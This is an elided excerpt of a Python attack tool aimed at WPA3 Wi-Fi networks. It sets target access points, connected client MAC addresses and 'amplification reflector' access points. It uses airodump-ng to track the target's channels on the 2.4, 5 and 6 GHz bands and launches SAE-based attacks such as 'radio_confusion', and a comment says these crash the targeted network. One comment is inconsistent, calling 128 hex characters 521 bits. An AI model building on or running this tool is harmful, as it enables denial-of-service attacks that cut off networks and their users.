...
TARGET_BSSID_6GHZ = "AA:BB:CC:DD:EE:11" # 6 GHz band BSSID
...
# Parameters for 6 GHz Network
SAE_SCALAR_6_HEX = 'INSERT_6_SCALAR_HERE' # 64 hex chars (256 bits)
SAE_FINITE_6_HEX = 'INSERT_6_FINITE_HERE' # 128 hex chars (521 bits)
...
SCANNER_INCLUDE_6GHZ = False # Set to True to enable 6 GHz scanning (uses frequency workaround)

# --- 4. MANUAL CHANNEL ASSIGNMENT (Required without scanner) ---
MANUELLER_KANAL_6GHZ = "5" # Typical 6 GHz channel
...
# - If you start the attack on 6 GHz:
# -> Enter MAC addresses of clients currently connected to 6 GHz.
TARGET_STA_MACS =[
    "AA:BB:CC:DD:EE:11",
    "AA:BB:CC:DD:EE:22"
]
...
AMPLIFICATION_REFLECTOR_APS_6GHZ =[
    "AA:BB:CC:DD:EE:33", 
    "AA:BB:CC:DD:EE:44", 
    "AA:BB:CC:DD:EE:55"
]
...
#            - If you start the attack on the 6 GHz band, the 5 GHz network is targeted/crashed.
...
ADAPTER_KONFIGURATION = {
    # --- 6 GHz Band ---
    # "wlan5mon": {"band": "6GHz", "angriff": "double_decker"},
...
def parse_airodump_csv(csv_file):
    ...
    Returns dictionary with {'2.4GHz': channel, '5GHz': channel, '6GHz': channel}
    """
    results = {}
    try:
        ...
        if len(sections) >= 1:
            ...
            for line in lines:
                ...
                if len(parts) >= 14:
                    ...
                    elif bssid.upper() == TARGET_BSSID_6GHZ.upper():
                        results['6GHz'] = channel
...
def get_airodump_scan_args(include_6ghz=False):
    """
...
def scanner_process(scanner_iface, interval, scan_duration, include_6ghz, shared_dict, lock):
    """
    ...
    print(f"[SCANNER] Starting on {scanner_iface} (Interval: {interval}s, Scan: {scan_duration}s, 6GHz: {include_6ghz})")
    ...
    while True:
        try:
            ...
            # Start airodump-ng (scans selected bands)
            cmd =[
                'airodump-ng',
                '--write', prefix,
                '--output-format', 'csv',
            ...
            cmd.extend(get_airodump_scan_args(include_6ghz))
            cmd.append(scanner_iface)
            ...
            if csv_files:
                ...
                with lock:
                    ...
                    # Update 6 GHz channel if found
                    if found_channels.get('6GHz'):
                        old_channel = shared_dict.get('6GHz')
                        new_channel = found_channels['6GHz']
                        if old_channel != new_channel:
                            shared_dict['6GHz'] = new_channel
                            print(f"\n[SCANNER] 6 GHz: Channel {old_channel} → {new_channel}")
            ...
            with lock:
                print(f"\r[SCANNER] Current: 2.4G={shared_dict.get('2.4GHz')}, 5G={shared_dict.get('5GHz')}, 6G={shared_dict.get('6GHz')}", end="")
                sys.stdout.flush()
...
def channel_to_freq(band, channel):
...
def run_attacker_process(interface, band, bssid, channel, attack_type, scalar_hex, finite_hex, 
    ...
    try:
        freq = channel_to_freq(band, channel)
        if freq:
            ...
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], 
                           check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[ATTACK] {interface} on channel {channel} ({band}) -> {attack_type}")
    except Exception as e:
    ...
    if SCANNER_INTERFACE:
        scanner_proc = Process(target=scanner_process, 
                               args=(SCANNER_INTERFACE, SCANNER_INTERVAL, SCANNER_DURATION, 
                                     SCANNER_INCLUDE_6GHZ, shared_channels, channel_lock))
            ...
            for interface, config in ADAPTER_KONFIGURATION.items():
                ...
                with channel_lock:
                    ...
                    if not target_channel:
                        ...
                        if band == '6GHz':
                            target_channel = MANUELLER_KANAL_6GHZ
                        elif band == '5GHz':
                            target_channel = MANUELLER_KANAL_5GHZ
                        else:
                            target_channel = MANUELLER_KANAL_2_4GHZ
                ...
                if restart_needed:
                    ...
                    if attack == "radio_confusion":
                        # Attack targets the OPPOSITE band (simple mapping)
                        if band == '2.4GHz':
                            target_band_logic = '5GHz'
                            opposite_bssid = TARGET_BSSID_5GHZ
                        elif band == '5GHz':
                            target_band_logic = '2.4GHz'
                            opposite_bssid = TARGET_BSSID_2_4GHZ
                        elif band == '6GHz':
                            target_band_logic = '5GHz'
                            opposite_bssid = TARGET_BSSID_5GHZ
                    else:
                    ...
                    if target_band_logic == '6GHz':
                        s_hex, f_hex = SAE_SCALAR_6_HEX, SAE_FINITE_6_HEX
                        target_bssid = TARGET_BSSID_6GHZ
                        reflectors = AMPLIFICATION_REFLECTOR_APS_6GHZ
...
7. REPEAT FOR ALL BANDS:
   - Extract separate values for 2.4 GHz, 5 GHz, and 6 GHz networks
...
NOTE: These values are SPECIFIC to:
   ...
   - The frequency band (2.4GHz vs 5GHz vs 6GHz)
""")
...
if __name__ == "__main__":
    ...
    if (SAE_SCALAR_2_4_HEX == 'INSERT_2_4_SCALAR_HERE' or 
        ...
        SAE_FINITE_5_HEX == 'INSERT_5_FINITE_HERE' or
        SAE_SCALAR_6_HEX == 'INSERT_6_SCALAR_HERE' or 
        SAE_FINITE_6_HEX == 'INSERT_6_FINITE_HERE'):
    ...
    if (TARGET_BSSID_6GHZ == "AA:BB:CC:DD:EE:11" or
        TARGET_BSSID_5GHZ == "AA:BB:CC:DD:EE:11" or 
